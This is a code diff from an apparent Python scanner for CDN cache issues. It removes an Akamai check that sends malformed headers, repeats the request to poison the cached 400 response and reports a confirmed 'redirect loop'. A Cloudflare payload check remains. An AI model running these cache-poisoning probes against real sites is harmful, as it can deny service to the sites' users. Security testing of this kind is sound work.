@@ -19,7 +19,6 @@ class analyze_cdn:
         """
         print("\033[36m ├ CDN analyse\033[0m")
         cdns = {
-        "Akamai": ["Akamai", "X-Akamai","X-Akamai-Transformed", "AkamaiGHost"],
         "Cloudflare": ["cf-ray", "cloudflare", "Cf-Cache-Status", "Cf-Ray"],
         #"CacheFly": "",
         #"Fastly": "",
@@ -38,30 +37,3 @@ class analyze_cdn:
             print(cf_loop.headers)
             if "CF-Cache-Status: HIT" in cf_loop.headers:
                 print("   \033[32m└──+\033[0m Potential redirect loop exploit possible with \033[32m{}\033[0m payload".format(headers))
-
-
-    def Akamai(self, url, s):
-        print("\033[36m --├ Akamai\033[0m")
-        headers = [{'"': "1"}, {"\\":"1"}]
-        url = "{}?aka_loop=123".format(url)
-        al_response = False
-        for h in headers:
-            try:
-                aka_loop = s.get(url, headers=h, verify=False, timeout=10)
-                if aka_loop.status_code == 400:
-                    for al in aka_loop.headers:
-                        if al == "Server-Timing" and "desc=HIT" in aka_loop.headers[al]:
-                            al_response = True
-                if al_response:
-                    for x in range(10):
-                        requests.get(url, headers=h, verify=False, timeout=10)
-                    aka_verif = requests.get(url, verify=False, timeout=10)
-                    if aka_verif.status_code == 400:
-                        print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | Akamai redirect loop | \033[34m{}\033[0m | PAYLOAD: {}".format(url, h))
-                        vuln_found_notify(url, h)
-            except:
-                print(" └── Error with this payload please check manually with this header: {}".format(h))
-
-    def envoy(self, url, s):
-        print("\033[36m --├ Envoy\033[0m")
-        print("TODO")
